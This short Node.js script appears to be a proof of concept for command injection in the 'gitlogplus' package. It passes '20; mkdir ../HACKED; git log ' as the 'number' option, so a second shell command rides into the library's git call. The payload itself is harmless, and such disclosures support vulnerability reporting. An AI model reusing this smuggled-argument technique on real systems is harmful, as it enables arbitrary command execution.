"use strict"

const gitlog = require('gitlogplus');
const options =
{
repo: __dirname + '/git',
number: '20; mkdir ../HACKED; git log '
};
let commits = gitlog(options);
console.log(commits);
